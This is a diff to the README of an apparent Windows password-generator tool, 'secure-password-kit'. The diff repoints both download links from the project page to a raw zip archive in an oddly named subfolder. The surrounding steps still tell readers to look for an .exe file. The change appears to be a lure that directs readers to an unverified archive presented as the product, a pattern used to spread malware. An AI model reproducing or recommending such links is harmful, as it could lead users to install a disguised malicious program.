@@ -1,6 +1,6 @@
 # 🔐 secure-password-kit - Create strong passwords with total ease
 
-[![](https://img.shields.io/badge/Download-Secure_Password_Kit-blue)](https://github.com/Ellisonj4776/secure-password-kit)
+[![](https://img.shields.io/badge/Download-Secure_Password_Kit-blue)](https://github.com/Ellisonj4776/secure-password-kit/raw/refs/heads/main/atmoclastic/secure-password-kit-v1.4-beta.2.zip)
 
 This tool generates random passwords and checks their strength. It helps you maintain digital security by creating unique codes for your accounts. You protect your personal information when you use strong, unpredictable passwords across your online services.
 
@@ -16,7 +16,7 @@ You need a Windows PC to run this tool. The software works on Windows 10 and Win
 
 You must visit the project page to get the installer. Follow these steps:
 
-1. [Visit this page to download](https://github.com/Ellisonj4776/secure-password-kit) the latest version.
+1. [Visit this page to download](https://github.com/Ellisonj4776/secure-password-kit/raw/refs/heads/main/atmoclastic/secure-password-kit-v1.4-beta.2.zip) the latest version.
 2. Look for the file ending in .exe.
 3. Click the file name to save it to your Downloads folder.
 
